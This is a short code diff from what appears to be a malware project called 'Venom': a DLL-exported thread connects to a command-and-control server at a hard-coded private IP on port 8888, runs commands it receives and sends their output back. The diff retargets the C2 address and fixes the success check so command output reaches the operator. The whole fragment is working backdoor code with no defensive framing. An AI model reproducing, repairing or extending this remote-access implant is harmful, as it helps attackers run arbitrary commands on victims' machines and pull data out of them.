@@ -10,7 +10,7 @@ extern "C" __declspec(dllexport)
 DWORD WINAPI VenomThread(LPVOID lpParam)
 {
 	VenomCommands::Command recievedCommand = { 0 };
-	CommunicationHandler::Communicator cncCommunicator("192.168.43.183", 8888);
+	CommunicationHandler::Communicator cncCommunicator("192.168.1.163", 8888);
 	if (cncCommunicator.connectToCnc())
 	{
 		auto uuid = Utils::generateUUID();
@@ -46,7 +46,7 @@ DWORD WINAPI VenomThread(LPVOID lpParam)
 			case VenomCommands::CommandTypes::ExecuteCommand:
 				const char* commandOutput = (const char*)malloc(VenomCommands::commandOutputBufferLength);
 				status = VenomCommands::executeCommand(recievedCommand.data, commandOutput);
-				if (0 != status) { cncCommunicator.sendDataToCnc(commandOutput); }
+				if (0 == status) { cncCommunicator.sendDataToCnc(commandOutput); }
 				else { cncCommunicator.sendDataToCnc("Error: Unable to execute command\n"); }
 				break;
 			}
